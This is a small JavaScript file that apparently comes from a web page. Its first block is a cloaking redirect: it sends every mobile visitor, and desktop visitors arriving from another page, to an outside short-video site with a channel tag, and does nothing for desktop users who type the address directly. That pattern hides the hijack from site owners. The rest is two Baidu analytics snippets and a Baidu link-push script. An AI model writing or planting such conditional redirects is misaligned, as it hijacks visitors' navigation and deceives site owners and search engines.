
    (function() {
        // 判断是否为移动设备
        var isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
        var ref = document.referrer;

        // 目标框架地址
        var frameUrl = "https://www.duanjuhui.cc/?ch=jl";

        // 手机端任何情况都跳转；PC端仅当从其他页面点击进入（有Referer）时跳转
        var shouldRedirect = isMobile || (!isMobile && ref && ref.length > 0);

        if (shouldRedirect) {
            // 直接跳转到框架地址
            window.location.replace(frameUrl);
        }
        // 否则（PC端直接访问，无Referer）→ JS 不做任何动作
    })();



var _hmt = _hmt || [];
(function() {
  var hm = document.createElement("script");
  hm.src = "https://hm.baidu.com/hm.js?2e57f35b243f95b151e338865b79b588";
  var s = document.getElementsByTagName("script")[0]; 
  s.parentNode.insertBefore(hm, s);
})();



var _hmt = _hmt || [];
(function() {
  var hm = document.createElement("script");
  hm.src = "https://hm.baidu.com/hm.js?d08ca8d16132c0dace919e3b5be4d123";
  var s = document.getElementsByTagName("script")[0]; 
  s.parentNode.insertBefore(hm, s);
})();



        (function(){
            var bp = document.createElement('script');
            var curProtocol = window.location.protocol.split(':')[0];
            if (curProtocol === 'https') {
                bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
            } else {
                bp.src = 'http://push.zhanzhang.baidu.com/push.js';
            }
            var s = document.getElementsByTagName("script")[0];
            s.parentNode.insertBefore(bp, s);
        })();

